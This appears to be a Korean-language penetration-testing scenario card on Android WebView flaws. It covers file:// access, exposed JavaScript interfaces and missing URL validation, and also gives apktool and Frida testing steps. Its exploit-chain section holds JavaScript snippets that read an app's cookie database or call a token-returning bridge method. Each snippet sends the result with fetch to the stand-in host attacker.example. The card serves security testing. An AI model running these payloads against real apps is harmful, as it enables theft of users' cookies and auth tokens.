# Scenario: Android WebView `file://` / JavaScript Interface RCE

> WebView 설정 미흡으로 로컬 파일 접근, same-origin 우회, 호스트 앱 기능 탈취.

## 1. Threat Model
- **타겟**: Android 앱의 `WebView` 컴포넌트
- **공격자**: 악성 웹 페이지 로드 유도 (deeplink, 리다이렉트, MitM, 내부 WebView 내 링크)
- **Impact**: `/data/data/<pkg>/` 내 민감 파일 읽기, JS interface로 네이티브 함수 호출, 인증 탈취
- **Severity**: High

## 2. Discovery Signals
- `setAllowFileAccess(true)` (Android 11 이전 기본값)
- `setAllowUniversalAccessFromFileURLs(true)`
- `setJavaScriptEnabled(true)` + `addJavascriptInterface(...)`
- `shouldOverrideUrlLoading` 검증 부재
- `setMixedContentMode(MIXED_CONTENT_ALWAYS_ALLOW)`

## 3. Exploit Chain

### 3.1 file:// origin escape
```javascript
// 공격자가 file:///sdcard/Download/evil.html 로 로드 유도
// evil.html 안에:
fetch('file:///data/data/com.victim.app/databases/cookies.db')
  .then(r => r.text())
  .then(txt => fetch('https://attacker.example/?d=' + encodeURIComponent(txt)));
```

### 3.2 JS interface 노출
```java
// Victim 앱
webView.addJavascriptInterface(new NativeBridge(), "Native");

class NativeBridge {
  @JavascriptInterface
  public String getToken() { return tokenStore.getBearerToken(); }
}
```
```javascript
// Attacker JS
const t = window.Native.getToken();
fetch('https://attacker.example/steal?t=' + t);
```

### 3.3 WebResourceRequest tamper
```java
// shouldOverrideUrlLoading 미구현 → 외부 URL 로드 시 검증 없음
// 공격자가 `myapp://` deeplink → webView.loadUrl(attacker_url)
```

### 3.4 Cookie 공유
```
CookieManager.getInstance().setAcceptCookie(true);
// 같은 origin의 native 요청 인증 쿠키를 webView JS가 접근 (일부 경우)
```

## 4. PoC Template
```bash
# 앱 분석
apktool d victim.apk
grep -rE "(setAllowFileAccess|UniversalAccess|JavascriptInterface)" victim/smali/
grep -rE "webView\.loadUrl\(.*intent\." victim/smali/

# 동적 테스트 — frida로 addJavascriptInterface 훅
frida -U -n com.victim.app -l hook.js
```

```javascript
// hook.js — JavaScript interface 이름/메서드 열거
Java.perform(function(){
  var WebView = Java.use('android.webkit.WebView');
  WebView.addJavascriptInterface.implementation = function(obj, name) {
    console.log("[+] addJavascriptInterface:", name, obj.getClass().getName());
    return this.addJavascriptInterface(obj, name);
  };
});
```

## 5. Evidence Tier
- E1: 네이티브 파일 읽기 또는 JS interface 호출 결과를 공격자 서버에 실제 exfil 증명
- E2: 정적 분석으로 취약 설정 증명 + 동적 probe 일부 성공
- E3: 설정값 식별만

## 6. Gate 1 / Gate 2
- [ ] 최신 Android 버전에서도 취약? `targetSdk` 확인
- [ ] WebView에 외부 URL 로드가 user action 기반인지 attacker-controlled인지
- [ ] JavaScript Interface는 `@JavascriptInterface` annotation 유무와 API 수준 확인

## 7. Variants
- **IntentUrl scheme**: `intent://` URL로 임의 activity 실행
- **WebView cache poisoning**: 중간자 공격 결합
- **getSettings().setSavePassword** (deprecated but some legacy apps)
- **DeviceId / IMEI** JS interface 노출

## 8. References
- OWASP MASTG — WebView 섹션
- Android 공식 WebView security guide
- CVE 다수: Android 11 미만 file access 기본값 관련
- `knowledge/techniques/mobile_testing_mastg.md`
